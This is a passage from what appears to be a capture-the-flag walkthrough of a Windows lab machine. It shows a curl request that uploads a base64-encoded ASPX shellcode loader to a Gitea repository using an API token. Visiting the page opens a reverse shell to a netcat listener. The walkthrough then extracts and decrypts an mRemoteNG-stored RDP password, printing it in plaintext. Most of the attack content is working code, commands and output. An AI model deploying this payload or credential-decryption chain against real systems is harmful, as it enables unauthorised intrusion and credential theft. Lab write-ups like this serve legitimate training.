❯ curl -s -X POST -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -H "Content-Type: application/json" http://10.129.29.102:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx -d '{"branch":"main","content":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gaEExZU5aeDg4RyA9IG5ldyBieXRlWzQ2MF0gezB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwMCwweDAwLDB4MDAsMHg0MSwweDUxLDB4NDEsCjB4NTAsMHg1MiwweDUxLDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsMHgyMCwKMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLAoweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweGUyLDB4ZWQsMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsCjB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwKMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLAoweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsCjB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwKMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LAoweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksCjB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MDAsMHgwMCwKMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLAoweDVjLDB4MGEsMHgwYSwweDBlLDB4ZmQsMHg0MSwweDU0LDB4NDksMHg4OSwweGU0LDB4NGMsMHg4OSwweGYxLDB4NDEsMHhiYSwweDRjLDB4NzcsMHgyNiwweDA3LDB4ZmYsCjB4ZDUsMHg0YywweDg5LDB4ZWEsMHg2OCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NTksMHg0MSwweGJhLDB4MjksMHg4MCwweDZiLDB4MDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwKMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLAoweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsCjB4YmEsMHg5OSwweGE1LDB4NzQsMHg2MSwweGZmLDB4ZDUsMHg0OCwweDgxLDB4YzQsMHg0MCwweDAyLDB4MDAsMHgwMCwweDQ5LDB4YjgsMHg2MywweDZkLDB4NjQsMHgwMCwKMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LAoweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDAxLDB4MDEsMHg0OCwweDhkLDB4NDQsMHgyNCwweDE4LDB4YzYsMHgwMCwweDY4LDB4NDgsCjB4ODksMHhlNiwweDU2LDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzAsMHg0MSwweDUwLDB4NDksMHhmZiwweGM4LDB4NGQsMHg4OSwKMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLAoweDQxLDB4YmEsMHgwOCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCjB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4MDYsMHg3YywweDBhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwKMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNX07CgogICAgICAgIEludFB0ciBsS0tHUzEgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpaEExZU5aeDg4Ry5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShoQTFlTlp4ODhHLDAsbEtLR1MxLGhBMWVOWng4OEcuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdUo2ZTZZY0daOSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciByX0ZwaGxWd1EwID0gQ3JlYXRlVGhyZWFkKEludFB0ci5aZXJvLFVJbnRQdHIuWmVybyxsS0tHUzEsSW50UHRyLlplcm8sMCxyZWYgdUo2ZTZZY0daOSk7CiAgICB9Cjwvc2NyaXB0Pgo=","message":"string"}' | jq
{
  "content": {
    "name": "reverse-shell.aspx",
    "path": "reverse-shell.aspx",
    "sha": "8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
    "last_commit_sha": "37c3b279fe89d548782737eee9fb6f21deb48ce4",
    "type": "file",
    "size": 3428,
    "encoding": "base64",
    "content": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gaEExZU5aeDg4RyA9IG5ldyBieXRlWzQ2MF0gezB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwMCwweDAwLDB4MDAsMHg0MSwweDUxLDB4NDEsCjB4NTAsMHg1MiwweDUxLDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsMHgyMCwKMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLAoweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweGUyLDB4ZWQsMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsCjB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwKMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLAoweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsCjB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwKMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LAoweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksCjB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MDAsMHgwMCwKMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLAoweDVjLDB4MGEsMHgwYSwweDBlLDB4ZmQsMHg0MSwweDU0LDB4NDksMHg4OSwweGU0LDB4NGMsMHg4OSwweGYxLDB4NDEsMHhiYSwweDRjLDB4NzcsMHgyNiwweDA3LDB4ZmYsCjB4ZDUsMHg0YywweDg5LDB4ZWEsMHg2OCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NTksMHg0MSwweGJhLDB4MjksMHg4MCwweDZiLDB4MDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwKMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLAoweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsCjB4YmEsMHg5OSwweGE1LDB4NzQsMHg2MSwweGZmLDB4ZDUsMHg0OCwweDgxLDB4YzQsMHg0MCwweDAyLDB4MDAsMHgwMCwweDQ5LDB4YjgsMHg2MywweDZkLDB4NjQsMHgwMCwKMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LAoweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDAxLDB4MDEsMHg0OCwweDhkLDB4NDQsMHgyNCwweDE4LDB4YzYsMHgwMCwweDY4LDB4NDgsCjB4ODksMHhlNiwweDU2LDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzAsMHg0MSwweDUwLDB4NDksMHhmZiwweGM4LDB4NGQsMHg4OSwKMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLAoweDQxLDB4YmEsMHgwOCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCjB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4MDYsMHg3YywweDBhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwKMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNX07CgogICAgICAgIEludFB0ciBsS0tHUzEgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpaEExZU5aeDg4Ry5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShoQTFlTlp4ODhHLDAsbEtLR1MxLGhBMWVOWng4OEcuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdUo2ZTZZY0daOSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciByX0ZwaGxWd1EwID0gQ3JlYXRlVGhyZWFkKEludFB0ci5aZXJvLFVJbnRQdHIuWmVybyxsS0tHUzEsSW50UHRyLlplcm8sMCxyZWYgdUo2ZTZZY0daOSk7CiAgICB9Cjwvc2NyaXB0Pgo=",
    "target": null,
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx?ref=main",
    "html_url": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse-shell.aspx",
    "git_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
    "download_url": "http://localhost:3000/ellen.freeman/website/raw/branch/main/reverse-shell.aspx",
    "submodule_git_url": null,
    "_links": {
      "self": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx?ref=main",
      "git": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
      "html": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse-shell.aspx"
    }
  },
  "commit": {
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/37c3b279fe89d548782737eee9fb6f21deb48ce4",
    "sha": "37c3b279fe89d548782737eee9fb6f21deb48ce4",
    "created": "0001-01-01T00:00:00Z",
    "html_url": "http://localhost:3000/ellen.freeman/website/commit/37c3b279fe89d548782737eee9fb6f21deb48ce4",
    "author": {
      "name": "ellen.freeman",
      "email": "ellen.freeman@lock.vl",
      "date": "2026-01-01T17:17:33Z"
    },
    "committer": {
      "name": "ellen.freeman",
      "email": "ellen.freeman@lock.vl",
      "date": "2026-01-01T17:17:33Z"
    },
    "parents": [
      {
        "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/9ae28589bb075b5343d68ecec6eec6d7d7f599e6",
        "sha": "9ae28589bb075b5343d68ecec6eec6d7d7f599e6",
        "created": "0001-01-01T00:00:00Z"
      }
    ],
    "message": "string\n",
    "tree": {
      "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/trees/41a883d994d150644ec58d644620d0adffab0140",
      "sha": "41a883d994d150644ec58d644620d0adffab0140",
      "created": "0001-01-01T00:00:00Z"
    }
  },
  "verification": {
    "verified": false,
    "reason": "gpg.error.not_signed_commit",
    "signature": "",
    "signer": null,
    "payload": ""
  }
}
```

<br />

Now, we can start a listener and navigate to `http://10.129.29.102/reverse-shell.aspx` and trigger the reverse shell execution:

<br />

```bash
❯ rlwrap nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.29.102 51111
Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
lock\ellen.freeman

c:\windows\system32\inetsrv>hostname
hostname
Lock
```

<br />

A reverse shell conection from the user `ellen.freeman` was sucessfully received.

<br />

# Privilege Escalation: ellen.freeman -> gale.dekarios 

<br />

After a while enumerating the system we discovered a `config.xml` file inside the directory: `C:\Users\ellen.freeman\Documents`

<br />

```xml
c:\Users\ellen.freeman\Documents>type config.xml
type config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

<br />

This file is a `mRemoteNG` connection configuration file. In that file we can observer that there is a user and a encrypted password:

- `User`: gare.dekarios 

- `Password`: TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==

<br />

This type of passwords are really easy to crack, this happens because they are using a weak encryption method. To decrypt it we will use the following python [script](https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/refs/heads/master/mremoteng_decrypt.py) from a public GitHub repository:

<br />

```bash
❯ python3 mremoteng_decrypt.py -s TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
Password: ty8wnW9qCKDosXo6
```

<br/>

Plaintext password: `ty8wnW9qCKDosXo6`


